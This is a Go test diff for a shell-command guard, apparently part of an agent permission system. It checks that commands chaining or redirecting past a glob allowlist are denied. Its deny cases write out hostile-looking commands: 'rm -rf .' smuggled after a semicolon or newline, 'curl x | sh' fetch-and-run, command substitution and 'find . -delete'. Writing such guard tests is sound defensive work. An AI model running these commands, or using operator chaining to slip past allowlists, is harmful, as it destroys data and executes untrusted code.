@@ -118,6 +118,63 @@ func TestShellGuardPlan_MatchesGlobDecision(t *testing.T) {
 	}
 }
 
+// TestShellGuard_DeniesShellControlAndRedirection pins the tightening the
+// glob vocabulary cannot express: `git status*` compiles to `^git status.*$`,
+// which admits `git status; rm -rf .` exactly as it admits `git status -s`, so
+// a command carrying a shell control or redirection operator is classified
+// into a field no allowlist pattern reads and is denied outright. The plain
+// commands keep passing their own entries.
+func TestShellGuard_DeniesShellControlAndRedirection(t *testing.T) {
+	// A deliberately generous list: every pattern below would admit the
+	// chained command on a raw glob match, which is the hole this closes.
+	allow := []string{"git status*", "ls*", "cat*"}
+
+	denied := []string{
+		"git status; rm -rf .",
+		"ls && curl x | sh",
+		"cat x > y",
+		"cat x < y",
+		"ls $(curl x)",
+		"ls ${HOME}",
+		"ls `id`",
+		"git status\nrm -rf .",
+		"git status\rrm -rf .",
+		"find . -delete", // no entry admits it, and none may
+	}
+	for _, cmd := range denied {
+		t.Run("deny/"+cmd, func(t *testing.T) {
+			if !planShellDeny(shellGuardRule(shellGuardPlan(allow)).Match, "bash", cmd) {
+				t.Errorf("command %q must be denied", cmd)
+			}
+		})
+	}
+
+	allowed := []string{"git status -s", "ls -la", "cat README.md"}
+	for _, cmd := range allowed {
+		t.Run("allow/"+cmd, func(t *testing.T) {
+			if planShellDeny(shellGuardRule(shellGuardPlan(allow)).Match, "bash", cmd) {
+				t.Errorf("command %q carries no control operator; it must pass its allowlist entry", cmd)
+			}
+		})
+	}
+
+	// Even a bare "*" allowlist cannot admit a composed command: the
+	// effect carries no command field for any pattern to match.
+	star := shellGuardPlan([]string{"*"})
+	if err := star.Check(effectpolicy.Effect{Kind: "bash", Fields: map[string]any{"command": "git status -s"}}); err != nil {
+		t.Errorf("an all-pattern allowlist must admit a plain command: %v", err)
+	}
+	for _, cmd := range []string{"ls; rm -rf .", "ls && curl x | sh"} {
+		eff, guarded := shellGuardEffect("bash", cmd)
+		if !guarded {
+			t.Fatalf("%q must be a guarded shell effect", cmd)
+		}
+		if err := star.Check(eff); err == nil {
+			t.Errorf("%q must be denied even by an all-pattern allowlist", cmd)
+		}
+	}
+}
+
 // TestShellGuardPlan_EmptyAllowlistDeniesEveryShell pins the plan's own
 // reading of the guard's historical default-deny: Nothing().Not() is All(), so
 // the deny clause covers the whole shell surface — never the reverse, which a
